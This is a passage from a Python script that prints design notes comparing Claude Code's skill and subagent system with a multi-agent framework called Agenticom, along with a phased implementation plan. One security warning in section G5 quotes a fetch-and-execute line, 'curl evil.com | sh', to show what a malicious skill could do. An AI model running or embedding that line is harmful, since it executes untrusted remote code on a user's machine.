  │  1       │  2 hours     │  3 new + 3 edit  │  dev +0.13, ver +0.15   │
  │  2       │  1 day       │  2 new + 2 edit  │  +0.05 (adaptive)       │
  │  3       │  2 days      │  2 new + 3 edit  │  +0.08 (evidence-based) │
  │  4       │  2-3 days    │  3 edit          │  +0.15 (tool access)    │
  ├──────────┼──────────────┼──────────────────┼─────────────────────────┤
  │  TOTAL   │  ~5-6 days   │  7 new + 11 edit │  +0.41 team composite   │
  └──────────┴──────────────┴──────────────────┴─────────────────────────┘

  Token overhead (Phase 1+2, capped at 400 tok/skill):
    4 agents × 2 skills × 400 tokens = 3,200 tokens per run
    At $3/M tokens: $0.010 per run overhead
    Break-even vs wasted retry LLM call: ~7 runs
"""

# ─────────────────────────────────────────────────────────────────────────────
#  SUMMARY
# ─────────────────────────────────────────────────────────────────────────────

SUMMARY = f"""
{box("SUMMARY  —  Key Conclusions")}

  WHAT Claude Code's skill system is:
    • An OPEN STANDARD (agentskills.io), not a proprietary format
    • Markdown instruction documents, NOT executable code
    • Progressive disclosure: 100-token metadata at startup, full body on demand
    • Skill activation: semantic (Claude decides) or explicit (/slash-command)
    • Skill content loads via bash cat command — NOT injected into system prompt
    • Scripts in skills/ execute via bash; only output enters context (zero cost)

  WHAT Claude Code's agentic workflow is:
    • A simple while-loop: gather → act → verify → repeat
    • 14 focused tools (deliberately minimal)
    • Context isolation via subagents (each has own context window)
    • Skills PREPARE agents; tools EXECUTE for them
    • Subagents ≠ Skills: isolated context vs main context

  WHERE Agenticom is DIFFERENT:
    • Multi-agent sequential pipeline (Ralph Loop) vs single-agent while-loop
    • No tool access during step execution (vs bash/file/web in Claude Code)
    • SMARC scoring after each run (Claude Code has no performance measurement)
    • Self-improving prompts (PromptEvolver) — unique to Agenticom
    • Workflow-scoped YAML configuration (Claude Code is project-level)

  WHERE Agenticom can be BETTER:
    ✓  Evidence-based skill selection (SMARC scores → skill routing)
    ✓  Per-step, per-agent skill scoping (YAML-controlled, not semantic)
    ✓  Skill evolution (PromptEvolver uses skills as patch material)
    ✓  Skill attribution (RunRecord tracks which skills helped)
    ✓  Deterministic activation (Tier 1 = guaranteed, Tier 2 = keyword, Tier 3 = SMARC)
    ✓  Deep flywheel integration (skills + SMARC + PromptEvolver + VersionStore)

  RECOMMENDED IMPLEMENTATION ORDER:
    Phase 1 (today):    SkillLoader + WorkflowParser injection (2 hours)
    Phase 2 (day 2):    SkillRouter + task-time routing (1 day)
    Phase 3 (day 3-4):  SkillGapMatcher + loop-driven injection (2 days)
    Phase 4 (day 5-7):  MCPToolBridge wired into LLMAgent (2-3 days)

  CONCRETE FIRST STEP:
    git clone https://github.com/sickn33/antigravity-awesome-skills .agent/skills
    → then implement orchestration/tools/skill_loader.py (30 lines)
    → then add +8 lines to orchestration/workflows/parser.py
    → then add skills: lists to agenticom/bundled_workflows/feature-dev.yaml
    → run case_study_01 and observe SMARC before/after

  Next exploration:
    python examples/exploration_03_tool_dispatch_mcp_wiring.py
      → Deep dive into wiring MCPToolBridge into LLMAgent._execute_task()
         (Phase 4 — giving agents REAL tool execution capability)
"""


# ─────────────────────────────────────────────────────────────────────────────
#  PART G  Corrections & deeper details (from official docs deep-dive)
# ─────────────────────────────────────────────────────────────────────────────

PART_G = f"""
{box("PART G  —  Corrections & Deeper Details (Official Docs)")}

{section("G1. The Skill tool is a META-TOOL, not individual tools")}

  CORRECTION to Part A: Skills do NOT load via bare "bash cat" commands.

  Claude Code has a single meta-tool named "Skill" with a `command` parameter:
    Skill(command="pdf-processing")

  The Skill tool's description contains a dynamically generated block:
    <available_skills>
      pdf-processing: Extract text and tables from PDF files...
      typescript-react-patterns: Expert patterns for React/TypeScript...
      ...
    </available_skills>

  Character budget for this block: 16,000 chars (scaled to 2% of context window).
  If installed skills exceed budget, some are excluded. Claude warns via /context.

  Claude selects which skill to invoke by pure LLM reasoning —
  reading the <available_skills> block and deciding which (if any) to call.
  No embedding similarity, no algorithmic routing, pure language model judgment.

{section("G2. Skill invocation uses TWO-MESSAGE injection")}

  When Claude calls Skill(command="skill-name"), two messages are injected:

  Message 1  (visible in UI):
    <command-message>The "skill-name" skill is loading</command-message>
    ← What the user sees in the chat interface

  Message 2  (hidden from UI, visible to model):
    [complete SKILL.md body content]
    ← Raw instructional text the model receives

  The body is NOT injected via bash. It is inserted directly as a hidden
  user message into the conversation. This means:
    (a) The model always has the full skill body once activated
    (b) There is no lazy file-loading mechanism — all or nothing
    (c) The 5,000-token recommendation exists to avoid context bloat

{section("G3. Claude Code extensions to the open standard")}

  The agentskills.io spec defines: name, description, license, compatibility,
  metadata, allowed-tools.

  Claude Code adds these extra frontmatter fields:

  ┌─ Extra field          ─ Default  ─ Purpose ─────────────────────────────┐
  │  argument-hint         —          Shown in autocomplete: [issue-number]  │
  │  disable-model-invoc.  false      True = only user can invoke (deploy,   │
  │                                   delete, other destructive ops)         │
  │  user-invocable        true       False = hide from /menu (background    │
  │                                   knowledge skills, not slash commands)  │
  │  context               (inline)   "fork" = run in isolated subagent ctxt │
  │  agent                 general    Which subagent: Explore, Plan, custom  │
  │  model                 inherit    Override model for this skill only      │
  │  hooks                 {{}}         Lifecycle hooks scoped to this skill   │
  └────────────────────────────────────────────────────────────────────────┘

  Invocation control matrix:
    (default)                          → user YES, Claude YES, desc always visible
    disable-model-invocation: true     → user YES, Claude NO,  desc NOT in context
    user-invocable: false              → user NO,  Claude YES, desc always visible

{section("G4. context: fork — the bridge between skills and subagents")}

  A skill with context: fork behaves like a subagent:

  Example:
    ---
    name: pr-summarizer
    description: Summarize a pull request with full diff analysis
    context: fork
    agent: Explore
    ---
    Analyze the PR diff and return a concise summary.

  When invoked:
    1. A fresh, isolated context window is created
    2. The `agent` field selects the system prompt (Explore uses Haiku model)
    3. The SKILL.md body becomes the TASK sent to that agent
    4. The subagent executes its tools in its own isolated context
    5. Distilled summary returns to main conversation

  This gives skill authors control over the cost/capability tradeoff:
    agent: Explore     → Haiku (fast, cheap, read-only)
    agent: Plan        → Read-only, no tool dispatch
    agent: general-purpose → Full tools, full model

{section("G5. Shell preprocessing syntax: !`command`")}

  Any shell command in backticks prefixed with ! in a skill body is executed
  BEFORE the skill content is sent to the model. The output replaces the expression.

  Example:
    ---
    name: git-context
    ---
    Current git status:
    !`git status --short`

    Recent commits:
    !`git log --oneline -10`

  When this skill is invoked, the git commands run first. Claude receives:
    "Current git status:\\n M orchestration/agents/base.py\\n..."
    "Recent commits:\\n1f9281d docs: add Case Study 2..."

  USE CASES:
    • Pull live data into skills (git status, env vars, API calls)
    • Dynamic context that changes per invocation
    • Avoid hardcoding values that might be stale

  SECURITY WARNING:
    !`command` has NO sandboxing, NO user approval.
    A malicious skill could: !`curl evil.com | sh`
    Treat skills from unknown sources as untrusted code.

{section("G6. String substitutions in skill body")}

  When invoking a skill with arguments (/skill-name arg1 arg2):

  Substitution        Example output
  ──────────────────────────────────────────────────────────────────────
  $ARGUMENTS          "arg1 arg2"  (all arguments as one string)
  $ARGUMENTS[0]       "arg1"
  $ARGUMENTS[1]       "arg2"
  $0                  "arg1"  (shorthand for $ARGUMENTS[0])
  $1                  "arg2"  (shorthand for $ARGUMENTS[1])
  ${{CLAUDE_SESSION_ID}} "ddc3f283-388d-4d19-b7c0-b9b4e76dfadc"

  If $ARGUMENTS appears in the body, arguments are substituted inline.
  If $ARGUMENTS does NOT appear, arguments are appended as:
    "ARGUMENTS: arg1 arg2"

  IMPLICATION for Agenticom skill design:
    Our skill files can use $ARGUMENTS for parameterized skills.
    Example: a skill invoked with the step ID could inject it via $0.
    This enables workflow-step-aware skills.

{section("G7. Subagents and their memory system")}

  Subagents can have PERSISTENT MEMORY across sessions via:
    memory:
      scope: project        # user | project | local
      path: .claude/agent-memory/my-agent/MEMORY.md

  At startup, the first 200 lines of MEMORY.md are injected into
  the subagent's context automatically. The subagent can update MEMORY.md
  during execution, and those updates persist to the next session.

  This enables:
    • A verifier subagent that remembers recurring failure patterns
    • A planner subagent that knows the team's naming conventions
    • A reviewer subagent with an evolving checklist of past issues

  IMPLICATION for Agenticom:
    Our lessons.py and PromptVersionStore already serve a similar purpose
    (cross-run knowledge capture). But they're global. Per-agent memory
    scoped to agent role would be more targeted and less noisy.

{section("G8. Key gaps in Claude Code that Agenticom addresses")}

  Claude Code gap                        Agenticom has it
  ──────────────────────────────────────────────────────────────────────
  No performance measurement             SMARC scores every run
  No skill attribution ("did it help?")  RunRecord.active_skills field
  No skill evolution                     PromptEvolver generates patches
  Non-deterministic skill activation     YAML-declared Tier 1 always fires
  No per-step skill scoping              Skills declared per-agent in YAML
  Skill budget cap (16k chars)           Agenticom: no system-level budget
                                          (we control injection per agent)
  No structured workflow templates       13 bundled workflow YAMLs
  Subagents cannot spawn subagents       Agenticom: sequential multi-agent
                                          pipeline handles this natively
  Skills are not chainable               Agenticom: YAML step.input_template
                                          {{{{step_outputs.X}}}} chains agents
  No feedback loop (skill → performance) Self-improvement loop closes it

  CRITICAL ADDITIONAL GAP in Claude Code (not mentioned in Part B):
  Background subagents cannot use MCP tools.
  Agenticom's MCPToolBridge is designed to be synchronous — once wired,
  all agents get tool access regardless of execution mode.
"""

# ─────────────────────────────────────────────────────────────────────────────
#  PART H  The antigravity-awesome-skills CATALOG.md extensions
# ─────────────────────────────────────────────────────────────────────────────

PART_H = f"""
{box("PART H  —  The antigravity-awesome-skills Catalog Extensions")}

{section("H1. What CATALOG.md adds beyond the open standard")}

  The sickn33/antigravity-awesome-skills repo uses CATALOG.md with fields
  NOT in the agentskills.io open standard:

  Open standard fields:   name, description, license, compatibility, metadata
  CATALOG.md additions:   Tags, Triggers, Risk, Source

  CATALOG.md entry format:
    ## skill-name
    Description: ...
    Tags: [Development, TypeScript, React]
    Triggers: react, tsx, hooks, component, next.js
    Risk: low
    Source: community | official | partner

  The V4 Checklist (enforced by npm run validate):
    ✓ description uses "Use when..." phrasing
    ✓ at least 3 tags covering domain, stack, and use-case
    ✓ at least 5 trigger keywords for reliable semantic matching
    ✓ risk level declared (low / medium / high / unknown)
    ✓ SKILL.md body has ## Overview, ## When to Use, ## Step-by-Step

{section("H2. How Agenticom can use CATALOG.md for skill_index.json")}

  When building our skill_index.json (Part E5), parse CATALOG.md entries:
    name        → skill_index key
    Triggers    → keywords array for SkillRouter scoring
    Tags        → role affinity mapping
    Risk        → tier assignment (high risk → TIER 3: NEVER)

  This gives us 868 skills pre-indexed with community-validated keywords
  and risk levels — instead of inferring them ourselves.

  Script: scripts/build_skill_index.py
    input:  .agent/skills/CATALOG.md
    output: .agent/skills/skill_index.json
    logic:  parse CATALOG.md → map Tags to AgentRole → map Triggers to keywords
            → assign tier based on Risk level and Tags content

  Example:
    Input CATALOG.md entry:
      Tags: [Security, OWASP, AppSec]
      Triggers: auth, injection, xss, csrf, token
      Risk: high

    Output skill_index.json entry:
      {{
        "keywords": ["auth", "injection", "xss", "csrf", "token"],
        "roles": ["verifier", "reviewer"],
        "tier": "conditional",      # high risk → conditional, not always-on
        "risk": "high",
        "smarc_triggers": ["output_actionability < 0.5"]
      }}

    Tag → Role mapping table:
      Development, TypeScript, Python, Go   → developer
      Testing, QA, TDD                      → tester
      Security, OWASP, AppSec               → verifier, reviewer
      Architecture, Design, DDD             → planner
      Business, Analysis, Research          → planner, analyst
      Infrastructure, DevOps, CI/CD         → developer, reviewer
"""


def main() -> None:
    print(PART_A)
    print(PART_B)
    print(PART_C)
    print(PART_D)
    print(PART_E)
    print(PART_F)
    print(PART_G)
    print(PART_H)
    print(SUMMARY)


if __name__ == "__main__":
    main()
